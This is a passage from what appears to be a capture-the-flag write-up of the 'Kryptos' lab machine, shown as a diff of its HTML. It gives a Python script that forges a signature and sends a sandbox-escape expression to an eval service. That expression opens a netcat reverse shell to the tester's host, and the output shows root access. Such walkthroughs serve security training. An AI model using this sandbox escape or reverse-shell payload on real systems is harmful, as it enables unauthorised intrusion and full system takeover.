+</code></pre>
+
+<p>So <a href="./resources/kryptos/break_signature_rce.py">our script</a> will contain:</p>
+
+<pre><code>seed = int(sys.argv[1])
+rand = secure_rng(seed) + 1
+sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+vk = sk.get_verifying_key()
+expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('" + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 9119 &gt;/tmp/f" + "')"
+req_data = { 'expr': expr, 'sig': sign(str.encode(expr)) }
+r = requests.post("http://127.0.0.1:81/eval", json=req_data)
+print r.text
+</code></pre>
+
+<p>So we setup a netcat listener and we run finally:</p>
+
+<pre><code>root@pentestbox:~# python break_signature_rce.py 41205234917818974876430183060164741391
+
+root@pentestobx:~# nc -lnvp 9119
+listening on [any] 9119 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.129] 55648
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# 
+</code></pre>
+
+<p>And we got root on Kryptos!</p>
+
+<h4 id="thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-">Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)</h4>
+
+:ET
